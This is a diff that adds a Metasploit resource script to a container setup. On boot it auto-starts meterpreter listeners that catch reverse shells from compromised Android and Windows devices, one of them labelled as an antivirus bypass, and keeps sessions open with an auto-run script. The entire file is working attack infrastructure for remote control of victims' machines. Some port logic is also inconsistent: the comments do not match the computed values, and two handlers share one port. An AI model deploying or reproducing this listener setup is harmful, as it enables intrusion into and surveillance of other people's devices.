@@ -1,0 +1,40 @@
+<ruby>
+# msf-autostart.rc — Auto-start handlers when MSF container boots.
+# Mounted at /autostart.rc inside the container.
+# The LHOST / LPORT values come from environment variables set in docker-compose.yml.
+
+lhost = ENV['METASPLOIT_LHOST'] || '0.0.0.0'
+lport      = (ENV['METASPLOIT_LPORT']      || '4444').to_i
+lport_https = (ENV['METASPLOIT_LPORT']    || '4444').to_i + 1   # 4443 default
+lport_http  = 8080
+
+# ── Android reverse_tcp handler ──────────────────────────────────────
+run_single("use exploit/multi/handler")
+run_single("set PAYLOAD android/meterpreter/reverse_tcp")
+run_single("set LHOST 0.0.0.0")
+run_single("set LPORT #{lport}")
+run_single("set ExitOnSession false")
+run_single("set AutoRunScript multi_console_command -rc /autorun_session.rc")
+run_single("run -j -z")
+
+# ── Windows x64 reverse_https handler ────────────────────────────────
+run_single("use exploit/multi/handler")
+run_single("set PAYLOAD windows/x64/meterpreter/reverse_https")
+run_single("set LHOST 0.0.0.0")
+run_single("set LPORT #{lport_https}")
+run_single("set ExitOnSession false")
+run_single("set HandlerSSLCert /payloads/server.pem")
+run_single("run -j -z")
+
+# ── Android reverse_https handler (AV bypass) ────────────────────────
+run_single("use exploit/multi/handler")
+run_single("set PAYLOAD android/meterpreter/reverse_https")
+run_single("set LHOST 0.0.0.0")
+run_single("set LPORT #{lport_https}")
+run_single("set ExitOnSession false")
+run_single("run -j -z")
+
+run_single("jobs -l")
+print_good("Handlers started: TCP=#{lport}, HTTPS=#{lport_https}, HTTP=#{lport_http}")
+print_good("LHOST for payloads: #{lhost}")
+</ruby>
